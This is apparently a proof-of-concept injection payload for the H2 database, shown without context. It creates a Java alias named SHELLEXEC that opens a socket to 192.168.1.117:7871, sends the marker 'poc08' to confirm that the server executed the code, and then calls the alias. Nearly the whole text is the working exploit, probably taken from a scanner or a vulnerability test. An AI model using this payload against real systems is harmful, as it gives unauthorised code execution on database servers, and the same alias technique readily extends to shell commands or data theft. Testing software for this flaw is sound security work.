CREATE ALIAS SHELLEXEC AS $$ String shellexec() throws java.io.IOException {
    Socket socket=new Socket("192.168.1.117",7871);
    socket.getOutputStream().write("poc08".getBytes());
    socket.close();}
$$;
CALL SHELLEXEC()